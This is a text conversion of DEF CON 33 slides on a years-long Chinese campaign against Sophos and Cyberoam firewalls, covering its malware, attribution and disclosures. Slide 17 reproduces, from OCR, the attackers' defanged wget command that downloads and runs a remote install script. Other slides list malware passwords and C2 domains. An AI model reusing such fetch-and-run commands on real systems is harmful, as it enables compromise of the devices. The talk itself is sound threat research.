---
title: "Firewall flameout Chinas 5+ year campaign to penetrate perimeter network defenses"
speakers: ["Andrew Brandt"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Andrew Brandt - Firewall flameout Chinas 5+ year campaign to penetrate perimeter network defenses.pdf"
pages: 65
sha256: "497ed7dbe8992dd338331a309308cfbfff2bec96a3d454cf72017d007a40495d"
text_chars: 21577
ocr_pages: 5
has_ocr: true
redacted_secrets: 0
ocr_confidence: 90.5
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:51:50Z"
---
# Firewall flameout Chinas 5+ year campaign to penetrate perimeter network defenses

**Speakers:** Andrew Brandt  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Andrew Brandt - Firewall flameout Chinas 5+ year campaign to penetrate perimeter network defenses.pdf` (65 pages)


## Slide 1

# Firewalls Under Fire

China’s ongoing campaign to compromise network protection devices worldwide

Andrew Brandt @ThreatResearch@infosec.exchange

#DEFCON #DEFCON33 #ThreatResearch

**Image source: San Diego Union-Tribune**

## Slide 2

## About me

•Threat research at Webroot, Solera Networks, Blue Coat, Symantec, Sophos, Netcraft

•Malware and network forensics, retrospective attack analysis

•“Investigative cyberattack journalism”

- •Elect More Hackers

•World Cyber Health/Malware Village

•Malware Village

•Media Archaeology Lab (CU Boulder)

#DEFCON #DEFCON33 #ThreatResearch

## Slide 3

## Context

•Timespan for these events is from 2018 – 2024(ish)

•Sophos X-Ops sits at the intersection of (and now encompasses) several teams of analysts and researchers

•Research conducted by many of my former peers and colleagues, compiled by me & X- Ops

•Too many technical details to cover in 40 minutes

#DEFCON #DEFCON33 #ThreatResearch

## Slide 4

## Dramatis Personae

- •Firewall vendors

   - •Other security companies

- •Chengdu, Sichuan, China

   - •Individual threat actors

   - •Companies

   - •A university

- •Firewalls and other edge devices

   - •Bare metal and virtual devices

#DEFCON #DEFCON33 #ThreatResearch

## Slide 5

## Attack phases/epochs

- •Initial attack & recon: 2018-2019

- •Mass-attack phase: 2020-2021

- •Targeted attacks and recurring use of old exploits with new payloads: 20212024

- •Research published October 2024

- •Attacks ongoing

**Source: FBI**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 6

## Public disclosure

- •Cloud Snooper (2020)

- •“Asnarök” public attacks (2020)

- •Bookmark feature buffer overflow (2021)

- •Personal Panda (2022)

- •Covert Channels (2023)

- •“Pacific Rim” encompassing these plus previously undisclosed campaigns (2024)

**Source: Sophos**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 7

## Why “Pacific Rim?”

•Cloud Snooper (2020) aka Arizona

•“Asnarök” (2020) aka Mexico

- •Bookmark feature buffer overflow (2021) aka Baja

- •Personal Panda (2022) aka Alaska

- •CVE-2022-3236 (2022) aka Yukon

•Covert Channels (2023) “Alaska part 2”

**Source: FBI Source: FBI**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 8

## Phase zero: The break-in

#DEFCON #DEFCON33 #ThreatResearch **Source: Sophos / Sergei Shevchenko**

## Slide 9

## The first domino

•NUC in Cyberoam office

- •The leaderboard is scanning the network •Investigation discovers tooling, malware on NUC ("Next Unit of Computing")

- •Discovery of a then-novel technique to pivot to cloud assets

- •Overly permissive AWS Identity & Access Management (IAM) configuration

#DEFCON #DEFCON33 #ThreatResearch

## Slide 10

## The first domino

•NUC in Cyberoam office

- •The leaderboard is scanning the network •Investigation discovers tooling, malware on NUC ("Next Unit of Computing")

- •Discovery of a then-novel technique to pivot to cloud assets

- •Overly permissive AWS Identity & Access Management (IAM) configuration

#DEFCON #DEFCON33 #ThreatResearch

## Slide 11

## Stealthy, cloud-based rootkit

- •Several malicious components installed on AWS server

- •Drops /tmp/snoopy

- •Deletes file, remains memory resident

**Source: Charles Schulz**

- •“Snoopy” monitors all inbound network packets for ones with specific source port numbers

- •The port number is the command

#DEFCON #DEFCON33 #ThreatResearch

## Slide 12

## Hidden in plain sight

- •Exfil disguised as normal outbound traffic

- •Contains some broken code that wouldn't ever be able to run

- •Alternate version drops Gh0st RAT named after a well-known FTP server daemon

- •Investigation also found eleven separate malware, including Onderon, custom backdoors that delete logs, and…a Gh0st RAT Windows DLL payload

#DEFCON #DEFCON33 #ThreatResearch

## Slide 13

## Quirky but rough around the edges

- •Cloud Snooper helpfully outputs debug messages…in Chinese

- •Payload decryption key is YaHo0@ •The C2 encryption key is based on hashing the phrase " _replace with your password_ "

- •C2 domains reference the ccTLD of the country of Nepal, .np and…

#DEFCON #DEFCON33 #ThreatResearch

## Slide 14

## Quirky but rough around the edges

- •Cloud Snooper helpfully outputs debug messages…in Chinese

- •Payload decryption key is YaHo0@ •The C2 encryption key is based on hashing the phrase " _replace with your password_ "

•C2 domains reference the ccTLD of the country of Nepal, .np and… `load.CollegeSmooch.com`

#DEFCON #DEFCON33 #ThreatResearch

## Slide 15

## 18 months later…

- •Sophos kept Cloud Snooper under wraps until early 2020.

- •Sergei Shevchenko and Tim Easton wrote up a report, but didn’t disclose to me that it described an attack against the company.

- •The analysis published on February 25, 2020 – just before the pandemic lockdowns

#### **Source: Sophos**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 16

## The mass attacks era

> #DEFCON #DEFCON33 #ThreatResearch **Source: Sophos**


> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Central management
ron @) Manage your firewall using
©@) Sophos Firewall Manager (SFM)
//sophosfirewallupdate.c
```

## Slide 17

## The mass attacks era

#DEFCON #DEFCON33 #ThreatResearch


> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Central management
ron @) Manage your firewall using
©@) Sophos Firewall Manager (SFM)
Firewall Manager IP address/domain *
https://sophosfirewallupdate.c |
l|cd /tmp/ && wget hxxps://sophosfirewallupdate[.]com/sp/Install.sh -O /tmp/x.sh && chmod 777 /tmp/x.sh && sh
```

## Slide 18

## Asnarök begins

•Day 0: Bug bounty awarded for CVE-2020-12271

- •Day 1 exploit. Thousands of firewalls affected

- •Day 2 hotfix patch

- •Day 11: new telemetry added

- •A few weeks later, a retro-hunt finds Patient Zero

**Source: Sophos**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 19

## Breaking and entering…the firewall

- •Uses domains registered just prior to the attack, with the vendor name in them

- •SQL injection leads to a Bash script

- •Modifies internal functions of firewall and establishes persistence

**Source:  Sophos / Dmitry Samosseiko**

- •Steals firewall config and locally saved user account data “2own” the firewall

- •Encrypts the data into a file named **info.xg** encrypted with the password GUCCI

#DEFCON #DEFCON33 #ThreatResearch

## Slide 20

## Burdened with glorious purpose?

•The malware featured a so-called _dead man’s switch_

- •If a zero-byte file gets deleted, it triggers an alternative payload

- •Delivered from a domain named after an event from Norse mythology (or maybe just a Marvel movie)

- •After Sophos released hotfixes, the “dead man’s switch” domain went live

**Source: Marvel/Comic Con | Sophos**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 21

## Ragnarok threatened

- •When triggered, it tried EternalBlue and DoublePulsar exploits to spread Ragnarok ransomware to Windows computers on the LAN side of the firewall

- Payload was named “hotfix”

- •Same ransomware deployed via vulnerable Citrix ADC servers in January 2020

**Source: Sophos** •Excluded computers with Chinese localization settings

#DEFCON #DEFCON33 #ThreatResearch

## Slide 22

## Ragnarok averted

- Exploits only work on Windows 7

- • Ransomware was easily blocked by endpoint software

**Source: Marvel**

#DEFCON #DEFCON33 #ThreatResearch **Source: Sophos**

## Slide 23

## Ragnarok averted

• Exploits only work on Windows 7 • Ransomware was easily blocked by endpoint software

**Source: Marvel**

**Source: C3 Entertainment**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 24

## Sinkhole, telemetry revelations

- •11 days after the attack, Dutch LE seizes the servers hosting “ragnarokfromasgard” and hands the domain off to Sophos to sinkhole

- •Many of the devices contacting the domain appear to be a variety of consumer and SOHO routers

- •Security Ops and engineering teams introduce new telemetry capabilities to XG firewalls…and “the implant”

**Source: Generative AI** #DEFCON #DEFCON33 #ThreatResearch

## Slide 25

## The implant & the hotfix

- •Sophos created a tool they call “the implant” or “the kernel implant”

- •Capable of retrieving logs and files from XG firewalls for advanced analysis

- •Does not show up in process lists on firewalls

- •Only deployed against firewalls who have a history of suspicious activity

**Source: Generative AI**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 26

## Using the kernel implant

•Security Operations deploys the implant to a small number of devices •Small-scale intrusions at targeted locations with unique payloads •They also see attackers testing new exploits they’re developing

- •Sophos uses the implant to retrieve malware, then hotfixes the vulns before they get widely exploited

**Image source: thespruce.com**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 27

## Summer of cat-and-mouse

- •56 days after Asnarök, attackers use CVE2020-15069 to hit thousands of firewalls at once, again, with webshells

- •The new telemetry capabilities mean Security Operations can dig for a patient zero device, again, and find it

- •This new bug was being tested in early April, before Asnarök had begun

- •Attackers sabotage the hotfix mechanism itself for the first time

**Source: Sophos**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 28

## How to find an exploit maker

- •Telemetry hunts find a cluster of XG firewalls geolocated in the city of Chengdu with fishy registration and nonstandard setups

- •They have almost nothing on the LAN side, and the firmware versions jump forward and back, like the device was being reflashed

- •Many of the devices are registered to an email that starts with “GBigMao”

#DEFCON #DEFCON33 #ThreatResearch **Image source: The Mirror (UK)**

## Slide 29

## Another character joins the fray

- •More weird behavior originates from firewalls registered in Chengdu

- •One of the devices previously was used by a lecturer at the University of Electronic Science and Technology of China (UESTC) in Chengdu

**Image source:  CBS / Paramount**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 30

## Another character joins the fray

- •The firewalls seem to leap between IP addresses in farflung locations, indicating the intermittent use of a VPN

**Image source:  CBS / Paramount**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 31

## Another character joins the fray

- •The firewalls seem to leap between IP addresses in farflung locations, indicating the intermittent use of a VPN

- •Registered to "TStark"

**Image source:  CBS / Paramount | Marvel**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 32

## Another character joins the fray

- •The firewalls seem to leap between IP addresses in farflung locations, indicating the intermittent use of a VPN

- •Registered to "TStark"

**Image source:  CBS / Paramount | Marvel | big sigh**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 33

## The Chengdu-APT41 nexus

•One of the kernel implants deployed on a TStark-registered device finds a copy of the Winnti rootkit on it

- •Sophos quietly patches all firewalls to immunize them to this type of malware, and it isn’t seen again

**Image source: LAC Watch**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 34

## The Chengdu-APT41 nexus

- •One of the kernel implants deployed on a TStark-registered device finds a copy of the Winnti rootkit on it

- •Sophos quietly patches all firewalls to immunize them to this type of malware, and it isn’t seen again

- •A week later, the implant retrieves malware for Apple OS X and iOS from another TStark-registered firewall

**Image source: LAC Watch**

**Image source:  Malmons World**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 35

## Apple malware is Insomnia implant

- •10 days after Sophos finds the iOS & OS X malware on TStark’s firewall, Volexity publishes a report on Evil Eye

- •Volexity’s report focuses on exploits against iOS phones targeting Uyghur support organizations

**Image source: Volexity**

- •Sophos and Volexity determine the samples are related, targeting Tibetan exile support organizations

#DEFCON #DEFCON33 #ThreatResearch

## Slide 36

## A last hurrah: Cyberoam attacks

•As 2020 comes to a close, the last mass-attack against Sophos products hits Cyberoam devices, which are nearing end-of-life

- •CVE-2020-29574 is abused to create “cybersupport” accounts on all devices

- •8 months later, in July 2021, France’s ANSSI attributes the attacks to APT-31

#### **Image source:  ANSSI France**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 37

## The targeted attacks era

Image source:  Generative AI

#DEFCON #DEFCON33 #ThreatResearch

## Slide 38

## Another 0day, another double dip

•On March 21, 2022, Sophos receives a bug bounty submission a day before an exploit involving the bug is observed in the wild

   - •CVE-2022-1040

- •The researcher, who did not wish to be credited, claimed they were based in Japan, but the IP of the device they were using geo-located to China

**Image source:  Depeche Mode**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 39

## Personal Panda victimology

**Image source: Chatham House**

- •The pair of bugs that combine to make the CVE-2022-1040 exploit bypass firewall authentication, then exploit OpenSSL (CVE-2022-1292) for root access

- •Most of the targeted devices appear to be located in sensitive positions in countries targeted by China’s “Belt and Road Initiative” around Asia

- •Targets also included the same Tibetan support group targeted in 2020

#DEFCON #DEFCON33 #ThreatResearch

## Slide 40

## Personal Panda tooling weirdness

- •One of the weirdest things was to find an embedded CA Root certificate in the malware left on the firewall

- •Why would the threat actor leave a cert forged to look like it was signed by Fortinet on a Sophos firewall?

**Image source:  Sophos**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 41

## Personal Panda tooling weirdness

#DEFCON #DEFCON33 #ThreatResearch

- •One of the weirdest things was to find an embedded CA Root certificate in the malware left on the firewall

- •Why would the threat actor leave a cert forged to look like it was signed by Fortinet on a Sophos firewall?

**Image source:  "The Naked Gun"**

**Image source:  Sophos**

## Slide 42

## A wild Pygmy Goat appears

- •A bespoke malware, libsophos.so

•Deployed just to two firewalls protecting a high-level government office in an Asian country

- •The malware employs some of the same network traffic concealment techniques as Cloud Snooper used

- •UK’s NCSC names it “Pygmy Goat”

**Image source:  City of Idaho Falls, ID**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 43

## Pygmy Goat’s Iron Man connection

- •While searching for more Pygmy Goat samples, Sophos finds the earliest example on two firewalls registered to the TStark identity who previously toyed with Winnti and Evil Eye/Insomnia payloads

- •TStark had tested both libsophos.so and an earlier version named libgoat.so on devices, including an identical version found on the compromised firewalls

#DEFCON #DEFCON33 #ThreatResearch **Image source: Marvel**

## Slide 44

## Pygmy Goat’s Iron Man connection

- •While searching for more Pygmy Goat samples, Sophos finds the earliest example on two firewalls registered to the TStark identity who previously toyed with Winnti and Evil Eye/Insomnia payloads

- •TStark had tested both libsophos.so and an earlier version named libgoat.so on devices, including an identical version found on the compromised firewalls

#DEFCON #DEFCON33 #ThreatResearch **Image source: Marvel + City of Idaho Falls, ID**

## Slide 45

DriftingCloud delivers a Sliver •Volexity shares IOCs from an XG that was -1040ed, used to MITM web traffic and steal creds

•The C2 IP address leads to another, single firewall running a unique malware sample Sophos determines is a component of the Sliver adversary emulation framework

**Image source: Volexity**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 46

## UEFI bootkit discovered

- •In August 2022, hunting discovered a firewall (already under surveillance) running suspicious commands

- •Using the kernel implant, analysts retrieved a file from the firewall. It turned out to be a development version of a UEFI bootkit called VectorEDK

### **Kaspersky: MosaicRegressor (VectorEDK)**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 47

## Covert Channels

•Sophos assisted a nuclear regulatory agency and a supplier in one of the targeted countries, starting in summer 2022

- •Discovery of CVE-2022-3236 led to malware

- •Payloads: custom Golang Trojan, Fast Reverse Proxy (FRP) & …

**Image source: The Telegraph (UK)**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 48

## Covert Channels attacks begin

•By September 2022, attackers become proficient with Trojanized JARs

   - •supplements existing system code

- •CVE-2022-3236 affects an outdated, EOL firmware version

- •Early targets have similar victimology to the targets of the Personal Panda attacks

**Image source: Sophos**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 49

## A JAR full of badness

•One JAR malware, called Termite, sniffs creds from the web admin interface, then performs DCSync attacks against LAN devices using those credentials, & deletes logs

- •One country in particular was targeted with attacks against firewalls protecting its water and power system, as well as military and state security entities

**Image source: New Girl (Elizabeth Meriwether Pictures and 20th Century Fox Television)**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 50

## Spring 2023 oddball payloads

**Image source:  MicroSocks Github**

- •From March through April 2023, Sophos investigated a cluster of infected firewalls at a government-owned tech supplier

- •Malware included a port mapper (LCS); a MicroSocks instance with a password of “Pa55W0rd,” a bespoke ELF backdoor to sniff credentials entered into the firewall, and a custom Go-based RAT

**Image source:  Buttons the rat Image source:  dvm360 on YouTube**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 51

## A hook for persistence

- •One firewall discovered in May 2023 was running an unremarkable remote shell that had pioneered a previously unknown persistence method, using plthook

- •The hook writes a backdoor into a temp partition that persists when the firewall reboots, for storing updates.

- •One of the firewalls believed to be run by the exploit developer has the same copy and firmware as the infected XG

**Image source: PLTHook documentation**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 52

## Where do we go from here?

#DEFCON #DEFCON33 #ThreatResearch **Image source: Mutant Enemy / Buffy The Vampire Slayer "Once More, With Feeling"**

## Slide 53

**Image source: FBI** #DEFCON #DEFCON33 #ThreatResearch

## Slide 54

**Image source: FBI** #DEFCON #DEFCON33 #ThreatResearch

## Slide 55

**Image source: FBI** #DEFCON #DEFCON33 #ThreatResearch

## Slide 56

**Image source: FBI** #DEFCON #DEFCON33 #ThreatResearch


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
malware exploiting the vulnerability |\CVE-2020-12271\as part of a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
```

## Slide 57

**Image source: FBI** #DEFCON #DEFCON33 #ThreatResearch


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
EEN
malware exploiting the vulnerability |\CVE-2020-12271\as part of
a widespread series of indiscriminate computer intrusions designed to exfiltrate sensitive data
from firewalls worldwide. The FBI is seeking information regarding} the identities of the individuals responsible for these cyber intrusions.
```

## Slide 58

## Scope creep

•Including the Sophos vulnerabilities, the report lists 206 other serious vulnerabilities that affected firewalls up to a year ago.

- •25 other vendors are represented, including Barracuda, Check Point, Cisco, Citrix, Fortinet, Ivanti, Juniper, Palo Alto, and Sonicwall

- •132 have a CVSS of >8

- •92 are =>9.8

- •Operational Relay Beacons

> #DEFCON #DEFCON33 #ThreatResearch **Image source: Robert Tinney / Byte Manazine, December 1977**

## Slide 59

## Just in the past MONTH(ish)

- •Cisco 3x exploited critical vulns in Identity Services Engine (June 25)

- •Fortinet "FortiWeb" exploit (July 18)

- •Sophos – 5 critical CVEs patched (July 21)

- •Microsoft "ToolShell" Sharepoint attacks (July 22)

- •SonicWall 0day – Akira (Aug 5)

**Image source: Infosecurity Magazine**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 60

## Is CNVD ≥ CVE?

- •2022 Labscon talk by Kristin Del Rosso

- •China’s vulnerability discovery process is industrialized – and secretive

- •Maintainers work to prevent USbased researchers accessing it

- •It seems to have…more

**Image source: SentinelOne/LabsCon**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 61

## Before breaking bad

- •GBigMao used to want to report vulnerabilities to vendors…not to get paid, but to “fix these quickly”

**Image source: OpenWall listserv archive**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 62

## Indictment: Guan “GBigMao” Tianfeng

**Image source: FBI Most Wanted List**

#DEFCON #DEFCON33 #ThreatResearch


> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Most Wanted
Ten Most Wanted Fugitives Fugitives | Terrorism | Kidnappings/Missing Persons | Parental Kidnay
Crimes Against Children | Murder | Additional Violent Crimes | Cyber | White Collar Crimes | Cou!
GUAN TIANFENG
Conspiracy to Commit Computer Fraud; Conspiracy to Commit Wire Fraud
gxiaomao
Aliases: Image source: FBI Most Wanted List
gbigmao, gxiaomao
```

## Slide 63

## Nobody is an exclusive target

•All software has bugs

- •All firewalls are used to protect important things

- •All firewalls are currently under threat by China’s hackers

- •Diplomacy and the rule of law are under attack everywhere

- •Where do we turn?

**Image source: Charles Schulz**

#DEFCON #DEFCON33 #ThreatResearch

## Slide 64

## Infosec ISAC

**Image source: United Nations general assembly**

- •All 26 vendors represented on the Appendix III list need to be in regular contact

- •As well as every other company that makes a device that faces the public internet

- •Whether it’s through industry sharing orgs like CTA, or something else

#DEFCON #DEFCON33 #ThreatResearch

## Slide 65

## Acknowledgments

Sophos:

- Tim Easton, Craig Jones, Sabrina Karim, Joe Levy, Ross McKerchar, Elison Niven, Darshan Raghwani, Brijesh Rajput, Tom Sage, Dmitry Samosseiko, Sergei Shevchenko, Emily Taylor, many others

Volexity:

• Steven Adair, Tom Lancaster Recorded Future Microsoft CISA, FBI, NCSC-UK, NCSC-NL, ANSSI Many others

Get in touch:

andrew.brandt@worldcyber.health fuf@electmorehackers.com @threatresearch@infosec.exchange

QUESTIONS: PacificRim@Sophos.com

**Image source: Unknown retro comic book**

#DEFCON #DEFCON33 #ThreatResearch
